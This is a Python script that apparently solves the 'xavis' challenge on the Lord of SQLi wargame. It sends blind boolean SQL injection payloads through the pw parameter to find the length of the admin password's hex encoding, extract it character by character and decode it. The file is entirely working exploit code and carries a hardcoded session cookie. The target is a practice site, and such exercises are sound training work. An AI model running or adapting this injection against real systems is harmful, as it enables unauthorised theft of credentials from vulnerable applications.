import requests
import string

url = "https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php?"
cookie = {'PHPSESSID':'niq1sjuo2o30eavfbhd3aneup4'}

def hex_pw_length():
    hex_pw_len = 0
    while True:
        hex_pw_len += 1
        query = "pw=%27%20or%20id=%27admin%27%20and%20length(hex(pw))={}%20%23".format(hex_pw_len)
        res = requests.get(url=url+query, cookies=cookie)
        print("try " + query)
        if "Hello admin" in res.text:
            print("PASSWORD LENGTH : " + str(hex_pw_len))
            break
    return(hex_pw_len)

def hex_pw_char(hex_pw_len):
    hex_passwd = ""
    for i in range(1, hex_pw_len+1):
        for j in string.printable:
            query = "pw=%27%20or%20id=%27admin%27%20and%20substr(hex(pw),{},1)='{}'%23".format(i,j)
            res = requests.get(url=url+query, cookies=cookie)
            print("try " + query)
            if "Hello admin" in res.text:
                hex_passwd += j
                print("PASSWORD CHAR : " + j)
                break
    return(hex_passwd)

def hex_to_string(hex_passwd):
    passwd = ""
    start = 0
    end = 0
    for i in range(int(len(hex_passwd)/8)):
        end += 8
        passwd += chr(int("0x" + hex_passwd[start:end], base=16))
        start += 8
    print("PASSWORD : " + passwd)  
        
if __name__ == "__main__":
    hex_pw_len = hex_pw_length()
    hex_passwd = hex_pw_char(hex_pw_len)
    hex_to_string(hex_passwd)